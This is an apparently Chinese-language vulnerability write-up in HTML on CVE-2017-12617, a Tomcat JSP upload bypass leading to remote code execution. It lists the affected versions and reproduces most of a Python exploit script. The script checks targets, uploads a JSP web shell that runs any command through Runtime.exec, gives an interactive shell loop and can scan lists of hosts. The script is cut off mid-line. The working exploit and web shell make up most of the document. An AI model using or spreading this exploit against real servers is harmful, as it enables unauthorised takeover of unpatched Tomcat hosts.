<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="X0c43a9be2aa2540a4f5216dfdc9d92f7c4a3b8b"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2017-12617</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Tomcat RCE via JSP Upload Bypass</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Apache Tomcat</span><span class="cs9C1B1871">版本</span><span class="cs8926E06">9.0.0.M1</span><span class="cs9C1B1871">至</span><span class="cs8926E06">9.0.0</span><span class="cs9C1B1871">、</span><span class="cs8926E06">8.5.0</span><span class="cs9C1B1871">至</span><span class="cs8926E06">8.5.22</span><span class="cs9C1B1871">、</span><span class="cs8926E06">8.0.0.RC1</span><span class="cs9C1B1871">至</span><span class="cs8926E06">8.0.46</span><span class="cs9C1B1871">和</span><span class="cs8926E06">7.0.0</span><span class="cs9C1B1871">至</span><span class="cs8926E06">7.0.81</span><span class="cs9C1B1871">且启用</span><span class="cs8926E06">HTTP PUT</span><span class="cs9C1B1871">时（例如，通过设置只读如果将</span><span class="cs8926E06">Default servlet</span><span class="cs9C1B1871">的初始化参数设置为</span><span class="cs8926E06">false</span><span class="cs9C1B1871">，则可以通过特制请求将</span><span class="cs8926E06">JSP</span><span class="cs9C1B1871">文件上载到服务器。然后可以请求此</span><span class="cs8926E06">JSP</span><span class="cs9C1B1871">，并且服务器将执行其中包含的所有代码。</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Apache Tomcat</span><span class="cs9C1B1871">版本</span><span class="cs8926E06">9.0.0.M1</span><span class="cs9C1B1871">至</span><span class="cs8926E06">9.0.0<br/>Apache Tomcat</span><span class="cs9C1B1871">版本</span><span class="cs8926E06">8.5.0</span><span class="cs9C1B1871">至</span><span class="cs8926E06">8.5.22<br/>Apache Tomcat</span><span class="cs9C1B1871">版本</span><span class="cs8926E06">8.0.0.RC1</span><span class="cs9C1B1871">至</span><span class="cs8926E06">8.0.46<br/>Apache Tomcat</span><span class="cs9C1B1871">版本</span><span class="cs8926E06">7.0.0</span><span class="cs9C1B1871">至</span><span class="cs8926E06">7.0.81</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs5BEC2C28">msf</span><span class="csE3F655E4">自带的有利用脚本，懒省事可以直接用</span><span class="cs5BEC2C28">msf</span><span class="cs8926E06"><br/><img src="Web安全/Tomcat/%ef%bc%88CVE-2017-12617%ef%bc%89Tomcat%20RCE%20via%20JSP%20Upload%20Bypass_files/image0.png" width="560" height="329" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs5BEC2C28">useage</span></p><p class="cs3A447A38"><span class="cs9FB05234">./cve-2017-12617.py -u http://www.0-sec.org</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">./cve-2017-12617.py --url http://www.0-sec.org</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">./cve-2017-12617.py -u http://www.0-sec.org -p pwn</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">./cve-2017-12617.py --url http://www.0-sec.org -pwn pwn</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">./cve-2017-12617.py -l hotsts.txt</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">./cve-2017-12617.py --list hosts.txt</span></p><p class="cs3A447A38"><span class="cs9FB05234">#!/usr/bin/python</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import re</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import signal</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from optparse import OptionParser</span><span class="cs8926E06"><br/><br/><br/><br/><br/><br/><br/></span><span class="cs9FB05234">class bcolors:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;HEADER = &#39;\033[95m&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;OKBLUE = &#39;\033[94m&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;OKGREEN = &#39;\033[92m&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;WARNING = &#39;\033[93m&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;FAIL = &#39;\033[91m&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ENDC = &#39;\033[0m&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;BOLD = &#39;\033[1m&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;UNDERLINE = &#39;\033[4m&#39;</span><span class="cs8926E06"><br/><br/><br/><br/><br/></span><span class="cs9FB05234">banner=&quot;&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;_______ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;________ &nbsp;&nbsp;&nbsp;___ &nbsp;&nbsp;___ &nbsp;__ ______ &nbsp;&nbsp;&nbsp;&nbsp;__ ___ &nbsp;&nbsp;__ __ ______ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;/ ____\ \ &nbsp;&nbsp;&nbsp;/ / &nbsp;____| &nbsp;|__ \ / _ \/_ |____ &nbsp;| &nbsp;&nbsp;/_ |__ \ / //_ |____ &nbsp;|</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> | | &nbsp;&nbsp;&nbsp;&nbsp;\ \ &nbsp;/ /| |__ ______ ) | | | || | &nbsp;&nbsp;/ /_____| | &nbsp;) / /_ | | &nbsp;&nbsp;/ / </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> | | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\ \/ / | &nbsp;__|______/ /| | | || | &nbsp;/ /______| | / / &#39;_ \| | &nbsp;/ / &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> | |____ &nbsp;&nbsp;\ &nbsp;/ &nbsp;| |____ &nbsp;&nbsp;&nbsp;/ /_| |_| || | / / &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| |/ /| (_) | | / / &nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;\_____| &nbsp;&nbsp;\/ &nbsp;&nbsp;|______| &nbsp;|____|\___/ |_|/_/ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|_|____\___/|_|/_/ &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[@intx0x80]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&quot;&quot;&quot;</span><span class="cs8926E06"><br/><br/><br/><br/><br/><br/></span><span class="cs9FB05234">def signal_handler(signal, frame):</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print (&quot;\033[91m&quot;+&quot;\n[-] Exiting&quot;+&quot;\033[0m&quot;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;exit()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">signal.signal(signal.SIGINT, signal_handler)</span><span class="cs8926E06"><br/><br/><br/><br/><br/></span><span class="cs9FB05234">def removetags(tags):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;remove = re.compile(&#39;&lt;.*?&gt;&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;txt = re.sub(remove, &#39;\n&#39;, tags)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;return txt.replace(&quot;\n\n\n&quot;,&quot;\n&quot;)</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def getContent(url,f):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;headers = {&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36&#39;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;requests.packages.urllib3.disable_warnings()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;re=requests.get(str(url)+&quot;/&quot;+str(f), headers=headers,verify=False)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return re.content</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def createPayload(url,f):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;evil=&#39;&lt;% out.println(&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;);%&gt;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;headers = {&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36&#39;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;requests.packages.urllib3.disable_warnings()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;req=requests.put(str(url)+str(f)+&quot;/&quot;,data=evil, headers=headers,verify=False)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if req.status_code==201:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;File Created ..&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">def RCE(url,f):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;EVIL=&quot;&quot;&quot;&lt;FORM METHOD=GET ACTION=&#39;{}&#39;&gt;&quot;&quot;&quot;.format(f)+&quot;&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;INPUT name=&#39;cmd&#39; type=text&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;INPUT type=submit value=&#39;Run&#39;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;/FORM&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;%@ page import=&quot;java.io.*&quot; %&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;%</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;String cmd = request.getParameter(&quot;cmd&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;String output = &quot;&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;if(cmd != null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String s = null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Process p = Runtime.getRuntime().exec(cmd,null,null);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BufferedReader sI = new BufferedReader(new</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">InputStreamReader(p.getInputStream()));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while((s = sI.readLine()) != null) { output += s+&quot;&lt;/br&gt;&quot;; }</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} &nbsp;catch(IOException e) { &nbsp;&nbsp;e.printStackTrace(); &nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">%&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;pre&gt;&lt;%=output %&gt;&lt;/pre&gt;&quot;&quot;&quot;</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;headers = {&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36&#39;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;requests.packages.urllib3.disable_warnings()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;req=requests.put(str(url)+f+&quot;/&quot;,data=EVIL, headers=headers,verify=False)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def shell(url,f):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;while True:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;headers = {&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36&#39;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmd=raw_input(&quot;$ &quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload={&#39;cmd&#39;:cmd}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if cmd==&quot;q&quot; or cmd==&quot;Q&quot;:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;requests.packages.urllib3.disable_warnings()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;re=requests.get(str(url)+&quot;/&quot;+str(f),params=payload,headers=headers,verify=False)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;re=str(re.content)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;t=removetags(re)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print t</span><span class="cs8926E06"><br/><br/><br/><br/><br/><br/></span><span class="cs9FB05234">#print bcolors.HEADER+ banner+bcolors.ENDC</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">parse=OptionParser(</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">bcolors.HEADER+&quot;&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;_______ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;________ &nbsp;&nbsp;&nbsp;___ &nbsp;&nbsp;___ &nbsp;__ ______ &nbsp;&nbsp;&nbsp;&nbsp;__ ___ &nbsp;&nbsp;__ __ ______ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;/ ____\ \ &nbsp;&nbsp;&nbsp;/ / &nbsp;____| &nbsp;|__ \ / _ \/_ |____ &nbsp;| &nbsp;&nbsp;/_ |__ \ / //_ |____ &nbsp;|</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> | | &nbsp;&nbsp;&nbsp;&nbsp;\ \ &nbsp;/ /| |__ ______ ) | | | || | &nbsp;&nbsp;/ /_____| | &nbsp;) / /_ | | &nbsp;&nbsp;/ / </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> | | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\ \/ / | &nbsp;__|______/ /| | | || | &nbsp;/ /______| | / / &#39;_ \| | &nbsp;/ / &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> | |____ &nbsp;&nbsp;\ &nbsp;/ &nbsp;| |____ &nbsp;&nbsp;&nbsp;/ /_| |_| || | / / &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| |/ /| (_) | | / / &nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;\_____| &nbsp;&nbsp;\/ &nbsp;&nbsp;|______| &nbsp;|____|\___/ |_|/_/ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|_|____\___/|_|/_/ &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">./cve-2017-12617.py [options]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">options:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">-u ,--url [::] check target url if it&#39;s vulnerable </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">-p,--pwn &nbsp;[::] generate webshell and upload it</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">-l,--list [::] hosts list</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+]usage:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">./cve-2017-12617.py -u http://127.0.0.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">./cve-2017-12617.py --url http://127.0.0.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">./cve-2017-12617.py -u http://127.0.0.1 -p pwn</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">./cve-2017-12617.py --url http://127.0.0.1 -pwn pwn</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">./cve-2017-12617.py -l hotsts.txt</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">./cve-2017-12617.py --list hosts.txt</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[@intx0x80]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&quot;&quot;&quot;+bcolors.ENDC</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">parse.add_option(&quot;-u&quot;,&quot;--url&quot;,dest=&quot;U&quot;,type=&quot;string&quot;,help=&quot;Website Url&quot;) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">parse.add_option(&quot;-p&quot;,&quot;--pwn&quot;,dest=&quot;P&quot;,type=&quot;string&quot;,help=&quot;generate webshell and upload it&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">parse.add_option(&quot;-l&quot;,&quot;--list&quot;,dest=&quot;L&quot;,type=&quot;string&quot;,help=&quot;hosts File&quot;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">(opt,args)=parse.parse_args()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">if opt.U==None and opt.P==None and opt.L==None:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(parse.usage)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;exit(0)</span><span class="cs8926E06"><br/><br/><br/><br/></span><span class="cs9FB05234">else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if opt.U!=None and opt.P==None and opt.L==None:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print bcolors.OKGREEN+banner+bcolors.ENDC </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;url=str(opt.U)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;checker=&quot;Poc.jsp&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print bcolors.BOLD +&quot;Poc Filename &nbsp;{}&quot;.format(checker)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;createPayload(str(url)+&quot;/&quot;,checker)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;con=getContent(str(url)+&quot;/&quot;,checker)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39; in con:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print bcolors.WARNING+url+&#39; it\&#39;s Vulnerable to CVE-2017-12617&#39;+bcolors.ENDC</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print bcolors.WARNING+url+&quot;/&quot;+checker+bcolors.ENDC</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &#39;Not Vulnerable to CVE-2017-12617 &#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;elif opt.P!=None and opt.U!=None and &nbsp;opt.L==None:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print 